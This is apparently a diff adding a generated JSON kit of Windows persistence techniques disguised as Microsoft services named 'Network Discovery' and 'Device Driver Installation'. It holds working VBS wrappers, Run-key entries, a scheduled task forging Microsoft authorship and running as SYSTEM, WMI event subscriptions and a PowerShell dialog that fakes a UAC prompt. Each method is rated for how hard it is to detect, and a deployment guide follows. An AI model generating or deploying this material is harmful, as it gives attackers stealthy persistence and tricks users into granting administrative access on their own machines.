+        "description": "Mimics legitimate Windows service initialization",
+        "filename": "network_discovery_startup.vbs",
+        "content": "\n' Windows Legitimate Service Startup\n' Network Discovery Service\n' Description: Enables discovery and connectivity of network devices\n' Generated: 2026-06-29T20:02:14.444936\n\nOption Explicit\n\nDim objShell, objFSO, strPath, objProcess, returnCode\n\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n' Permission request mimicking Windows security dialog\nFunction RequestUserPermission()\n    Dim objDialog, strMessage\n\n    strMessage = \"Windows \" & \"Network Discovery Service\" & \" requires administrative access.\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Details:\" & vbCrLf\n    strMessage = strMessage & \"  Service: Network Discovery Service\" & vbCrLf\n    strMessage = strMessage & \"  Description: Enables discovery and connectivity of network devices\" & vbCrLf\n    strMessage = strMessage & \"  Status: Initializing...\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Do you want to allow this program to make changes to your computer?\"\n\n    Dim intResult\n    intResult = objShell.Popup(strMessage, 0, \"User Account Control\", 4 + 48)\n\n    ' 6 = Yes, 7 = No\n    RequestUserPermission = (intResult = 6)\nEnd Function\n\n' Main startup sequence\nSub Main()\n    Dim strPayloadPath, strCommand, intExitCode\n\n    ' Payload execution path\n    strPayloadPath = \"C:\\Windows\\System32\\svchost.exe\"\n\n    ' Verify system prerequisites\n    If Not VerifySystemRequirements() Then\n        Exit Sub\n    End If\n\n    ' Request user permission (mimics UAC)\n    If Not RequestUserPermission() Then\n        Exit Sub\n    End If\n\n    ' Execute payload with system context\n    strCommand = \"cmd.exe /c start /b \"\"\" & strPayloadPath & \"\"\"\"\n\n    intExitCode = objShell.Run(strCommand, 0, True)\n\n    ' Log execution (legitimate services do this)\n    LogExecution(intExitCode)\nEnd Sub\n\n' Verify Windows version and system requirements\nFunction VerifySystemRequirements()\n    Dim objWMI, objOS, intVersion\n\n    Set objWMI = GetObject(\"winmgmts:\")\n    Set objOS = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\").ItemIndex(0)\n\n    ' Accepts Windows 7, 8, 10, 11\n    VerifySystemRequirements = (objOS.Version >= \"6.1\")\nEnd Function\n\n' Log execution (mimics legitimate service logging)\nSub LogExecution(intExitCode)\n    Dim strLogPath, objLogFile\n\n    strLogPath = objShell.ExpandEnvironmentStrings(\"%APPDATA%\\Microsoft\\Windows\\Logs\\network_discovery.log\")\n\n    On Error Resume Next\n    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)\n    If Not objLogFile Is Nothing Then\n        objLogFile.WriteLine \"[\" & Now & \"] Service initialization: Exit code \" & intExitCode\n        objLogFile.Close\n    End If\n    On Error GoTo 0\nEnd Sub\n\n' Entry point\nMain()\n\nSet objShell = Nothing\nSet objFSO = Nothing\n",
+        "detection_difficulty": "Medium",
+        "privileges": "User/Admin"
+      },
+      "registry_persistence": {
+        "name": "Registry Run Keys",
+        "description": "Persistent registry-based execution",
+        "detection_difficulty": "Low",
+        "entries": {
+          "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "entries": [
+            {
+              "name": "NetDiscovery",
+              "type": "REG_SZ",
+              "value": "\"C:\\Windows\\System32\\svchost.exe\"",
+              "description": "Startup entry for Network Discovery Service"
+            },
+            {
+              "name": "NetDiscovery_Description",
+              "type": "REG_SZ",
+              "value": "\"Enables discovery and connectivity of network devices\"",
+              "description": "Service description"
+            }
+          ]
+        }
+      },
+      "task_scheduler": {
+        "name": "Task Scheduler",
+        "description": "Scheduled task mimicking system maintenance",
+        "filename": "network_discovery_task.xml",
+        "content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2026-06-29T20:02:14.444936</Date>\n    <Author>Microsoft Corporation</Author>\n    <Version>1.4</Version>\n    <Description>Enables discovery and connectivity of network devices</Description>\n    <URI>\\Microsoft\\Windows\\network_discovery\\NetworkServiceInit</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n      <Delay>PT30S</Delay>\n    </BootTrigger>\n    <IdleTrigger>\n      <Enabled>true</Enabled>\n    </IdleTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>false</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>false</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>false</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>true</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Windows\\System32\\svchost.exe</Command>\n    </Exec>\n  </Actions>\n</Task>\n",
+        "detection_difficulty": "Medium",
+        "privileges": "System"
+      },
+      "wmi_subscription": {
+        "name": "WMI Event Subscription",
+        "description": "WMI-based persistence via event subscriptions",
+        "filename": "network_discovery_wmi.mof",
+        "content": "\n// WMI Event Subscription - Network Discovery Service\n// Purpose: Enables discovery and connectivity of network devices\n// Generated: 2026-06-29T20:02:14.444936\n\n#pragma autorecover\n\ninstance of __EventFilter as $EventFilter\n{\n    EventNamespace = \"root\\cimv2\";\n    Name = \"network_discovery_Monitor\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300\";\n    QueryLanguage = \"WQL\";\n};\n\ninstance of __EventConsumer as $EventConsumer\n{\n    Name = \"network_discovery_Executor\";\n    CommandLineTemplate = \"C:\\Windows\\System32\\svchost.exe\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n    Filter = $EventFilter;\n    Consumer = $EventConsumer;\n    Name = \"network_discovery_Binding\";\n};\n",
+        "detection_difficulty": "High",
+        "privileges": "System"
+      },
+      "uac_permission_dialog": {
+        "name": "UAC Permission Dialog",
+        "description": "Mimics legitimate Windows permission request",
+        "filename": "network_discovery_permission.ps1",
+        "content": "\n# UAC Permission Mimicker\n# Displays dialog similar to Windows User Account Control\n\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")\n\n$form = New-Object System.Windows.Forms.Form\n$form.Text = \"User Account Control\"\n$form.Size = New-Object System.Drawing.Size(500, 250)\n$form.StartPosition = \"CenterScreen\"\n$form.TopMost = $true\n$form.BackColor = [System.Drawing.Color]::White\n$form.ControlBox = $false\n\n# Shield icon\n$iconLabel = New-Object System.Windows.Forms.Label\n$iconLabel.Text = \"\ud83d\udee1\ufe0f\"\n$iconLabel.Font = New-Object System.Drawing.Font(\"Arial\", 48)\n$iconLabel.Size = New-Object System.Drawing.Size(60, 60)\n$iconLabel.Location = New-Object System.Drawing.Point(20, 20)\n$form.Controls.Add($iconLabel)\n\n# Message label\n$messageLabel = New-Object System.Windows.Forms.Label\n$messageLabel.Text = \"A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task\"\n$messageLabel.Size = New-Object System.Drawing.Size(400, 100)\n$messageLabel.Location = New-Object System.Drawing.Point(80, 20)\n$messageLabel.Font = New-Object System.Drawing.Font(\"Segoe UI\", 10)\n$form.Controls.Add($messageLabel)\n\n# Yes button\n$yesButton = New-Object System.Windows.Forms.Button\n$yesButton.Text = \"Yes\"\n$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes\n$yesButton.Location = New-Object System.Drawing.Point(300, 150)\n$yesButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.AcceptButton = $yesButton\n$form.Controls.Add($yesButton)\n\n# No button\n$noButton = New-Object System.Windows.Forms.Button\n$noButton.Text = \"No\"\n$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No\n$noButton.Location = New-Object System.Drawing.Point(390, 150)\n$noButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.CancelButton = $noButton\n$form.Controls.Add($noButton)\n\n$result = $form.ShowDialog()\nif ($result -eq [System.Windows.Forms.DialogResult]::Yes) {\n    # Permission granted - execute payload\n    & \"C:\\Windows\\System32\\svchost.exe\"\n}\n",
+        "detection_difficulty": "Very High (user interaction)",
+        "privileges": "User"
+      }
+    },
+    "deployment_guide": {
+      "step_1": "Choose persistence method based on privileges and detection requirements",
+      "step_2": "Generate files using methods above",
+      "step_3": "Request user permissions using UAC dialog",
+      "step_4": "Deploy to appropriate system location",
+      "step_5": "Verify execution on system restart"
+    }
+  },
+  "device_driver_installation": {
+    "timestamp": "2026-06-29T20:02:14.444936",
+    "service_type": "device_driver_installation",
+    "service_info": {
+      "display_name": "Device Driver Installation Service",
+      "description": "Automatically installs device drivers",
+      "registry_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    },
+    "methods": {
+      "vbs_startup_wrapper": {
+        "name": "VBS Startup Wrapper",
+        "description": "Mimics legitimate Windows service initialization",
+        "filename": "device_driver_installation_startup.vbs",
+        "content": "\n' Windows Legitimate Service Startup\n' Device Driver Installation Service\n' Description: Automatically installs device drivers\n' Generated: 2026-06-29T20:02:14.444936\n\nOption Explicit\n\nDim objShell, objFSO, strPath, objProcess, returnCode\n\nSet objShell = CreateObject(\"WScript.Shell\")\nSet objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n' Permission request mimicking Windows security dialog\nFunction RequestUserPermission()\n    Dim objDialog, strMessage\n\n    strMessage = \"Windows \" & \"Device Driver Installation Service\" & \" requires administrative access.\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Details:\" & vbCrLf\n    strMessage = strMessage & \"  Service: Device Driver Installation Service\" & vbCrLf\n    strMessage = strMessage & \"  Description: Automatically installs device drivers\" & vbCrLf\n    strMessage = strMessage & \"  Status: Initializing...\" & vbCrLf & vbCrLf\n    strMessage = strMessage & \"Do you want to allow this program to make changes to your computer?\"\n\n    Dim intResult\n    intResult = objShell.Popup(strMessage, 0, \"User Account Control\", 4 + 48)\n\n    ' 6 = Yes, 7 = No\n    RequestUserPermission = (intResult = 6)\nEnd Function\n\n' Main startup sequence\nSub Main()\n    Dim strPayloadPath, strCommand, intExitCode\n\n    ' Payload execution path\n    strPayloadPath = \"C:\\Windows\\System32\\svchost.exe\"\n\n    ' Verify system prerequisites\n    If Not VerifySystemRequirements() Then\n        Exit Sub\n    End If\n\n    ' Request user permission (mimics UAC)\n    If Not RequestUserPermission() Then\n        Exit Sub\n    End If\n\n    ' Execute payload with system context\n    strCommand = \"cmd.exe /c start /b \"\"\" & strPayloadPath & \"\"\"\"\n\n    intExitCode = objShell.Run(strCommand, 0, True)\n\n    ' Log execution (legitimate services do this)\n    LogExecution(intExitCode)\nEnd Sub\n\n' Verify Windows version and system requirements\nFunction VerifySystemRequirements()\n    Dim objWMI, objOS, intVersion\n\n    Set objWMI = GetObject(\"winmgmts:\")\n    Set objOS = objWMI.ExecQuery(\"Select * from Win32_OperatingSystem\").ItemIndex(0)\n\n    ' Accepts Windows 7, 8, 10, 11\n    VerifySystemRequirements = (objOS.Version >= \"6.1\")\nEnd Function\n\n' Log execution (mimics legitimate service logging)\nSub LogExecution(intExitCode)\n    Dim strLogPath, objLogFile\n\n    strLogPath = objShell.ExpandEnvironmentStrings(\"%APPDATA%\\Microsoft\\Windows\\Logs\\device_driver_installation.log\")\n\n    On Error Resume Next\n    Set objLogFile = objFSO.CreateTextFile(strLogPath, True)\n    If Not objLogFile Is Nothing Then\n        objLogFile.WriteLine \"[\" & Now & \"] Service initialization: Exit code \" & intExitCode\n        objLogFile.Close\n    End If\n    On Error GoTo 0\nEnd Sub\n\n' Entry point\nMain()\n\nSet objShell = Nothing\nSet objFSO = Nothing\n",
+        "detection_difficulty": "Medium",
+        "privileges": "User/Admin"
+      },
+      "registry_persistence": {
+        "name": "Registry Run Keys",
+        "description": "Persistent registry-based execution",
+        "detection_difficulty": "Low",
+        "entries": {
+          "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "entries": [
+            {
+              "name": "DriverInstall",
+              "type": "REG_SZ",
+              "value": "\"C:\\Windows\\System32\\svchost.exe\"",
+              "description": "Startup entry for Device Driver Installation Service"
+            },
+            {
+              "name": "DriverInstall_Description",
+              "type": "REG_SZ",
+              "value": "\"Automatically installs device drivers\"",
+              "description": "Service description"
+            }
+          ]
+        }
+      },
+      "task_scheduler": {
+        "name": "Task Scheduler",
+        "description": "Scheduled task mimicking system maintenance",
+        "filename": "device_driver_installation_task.xml",
+        "content": "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n  <RegistrationInfo>\n    <Date>2026-06-29T20:02:14.444936</Date>\n    <Author>Microsoft Corporation</Author>\n    <Version>1.4</Version>\n    <Description>Automatically installs device drivers</Description>\n    <URI>\\Microsoft\\Windows\\device_driver_installation\\DriverUpdateService</URI>\n  </RegistrationInfo>\n  <Triggers>\n    <BootTrigger>\n      <Enabled>true</Enabled>\n      <Delay>PT30S</Delay>\n    </BootTrigger>\n    <IdleTrigger>\n      <Enabled>true</Enabled>\n    </IdleTrigger>\n  </Triggers>\n  <Principals>\n    <Principal id=\"Author\">\n      <UserId>S-1-5-18</UserId>\n      <RunLevel>HighestAvailable</RunLevel>\n    </Principal>\n  </Principals>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>false</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <Duration>PT10M</Duration>\n      <WaitTimeout>PT1H</WaitTimeout>\n      <StopOnIdleEnd>false</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>false</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>true</WakeToRun>\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>C:\\Windows\\System32\\svchost.exe</Command>\n    </Exec>\n  </Actions>\n</Task>\n",
+        "detection_difficulty": "Medium",
+        "privileges": "System"
+      },
+      "wmi_subscription": {
+        "name": "WMI Event Subscription",
+        "description": "WMI-based persistence via event subscriptions",
+        "filename": "device_driver_installation_wmi.mof",
+        "content": "\n// WMI Event Subscription - Device Driver Installation Service\n// Purpose: Automatically installs device drivers\n// Generated: 2026-06-29T20:02:14.444936\n\n#pragma autorecover\n\ninstance of __EventFilter as $EventFilter\n{\n    EventNamespace = \"root\\cimv2\";\n    Name = \"device_driver_installation_Monitor\";\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300\";\n    QueryLanguage = \"WQL\";\n};\n\ninstance of __EventConsumer as $EventConsumer\n{\n    Name = \"device_driver_installation_Executor\";\n    CommandLineTemplate = \"C:\\Windows\\System32\\svchost.exe\";\n};\n\ninstance of __FilterToConsumerBinding\n{\n    Filter = $EventFilter;\n    Consumer = $EventConsumer;\n    Name = \"device_driver_installation_Binding\";\n};\n",
+        "detection_difficulty": "High",
+        "privileges": "System"
+      },
+      "uac_permission_dialog": {
+        "name": "UAC Permission Dialog",
+        "description": "Mimics legitimate Windows permission request",
+        "filename": "device_driver_installation_permission.ps1",
+        "content": "\n# UAC Permission Mimicker\n# Displays dialog similar to Windows User Account Control\n\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")\n\n$form = New-Object System.Windows.Forms.Form\n$form.Text = \"User Account Control\"\n$form.Size = New-Object System.Drawing.Size(500, 250)\n$form.StartPosition = \"CenterScreen\"\n$form.TopMost = $true\n$form.BackColor = [System.Drawing.Color]::White\n$form.ControlBox = $false\n\n# Shield icon\n$iconLabel = New-Object System.Windows.Forms.Label\n$iconLabel.Text = \"\ud83d\udee1\ufe0f\"\n$iconLabel.Font = New-Object System.Drawing.Font(\"Arial\", 48)\n$iconLabel.Size = New-Object System.Drawing.Size(60, 60)\n$iconLabel.Location = New-Object System.Drawing.Point(20, 20)\n$form.Controls.Add($iconLabel)\n\n# Message label\n$messageLabel = New-Object System.Windows.Forms.Label\n$messageLabel.Text = \"A program needs your permission to continue`n`nWindows System Service`nSystem Maintenance Task\"\n$messageLabel.Size = New-Object System.Drawing.Size(400, 100)\n$messageLabel.Location = New-Object System.Drawing.Point(80, 20)\n$messageLabel.Font = New-Object System.Drawing.Font(\"Segoe UI\", 10)\n$form.Controls.Add($messageLabel)\n\n# Yes button\n$yesButton = New-Object System.Windows.Forms.Button\n$yesButton.Text = \"Yes\"\n$yesButton.DialogResult = [System.Windows.Forms.DialogResult]::Yes\n$yesButton.Location = New-Object System.Drawing.Point(300, 150)\n$yesButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.AcceptButton = $yesButton\n$form.Controls.Add($yesButton)\n\n# No button\n$noButton = New-Object System.Windows.Forms.Button\n$noButton.Text = \"No\"\n$noButton.DialogResult = [System.Windows.Forms.DialogResult]::No\n$noButton.Location = New-Object System.Drawing.Point(390, 150)\n$noButton.Size = New-Object System.Drawing.Size(80, 30)\n$form.CancelButton = $noButton\n$form.Controls.Add($noButton)\n\n$result = $form.ShowDialog()\nif ($result -eq [System.Windows.Forms.DialogResult]::Yes) {\n    # Permission granted - execute payload\n    & \"C:\\Windows\\System32\\svchost.exe\"\n}\n",
+        "detection_difficulty": "Very High (user interaction)",
+        "privileges": "User"
+      }
+    },
+    "deployment_guide": {
+      "step_1": "Choose persistence method based on privileges and detection requirements",
+      "step_2": "Generate files using methods above",
+      "step_3": "Request user permissions using UAC dialog",
+      "step_4": "Deploy to appropriate system location",
+      "step_5": "Verify execution on system restart"
+    }
+  }
+}
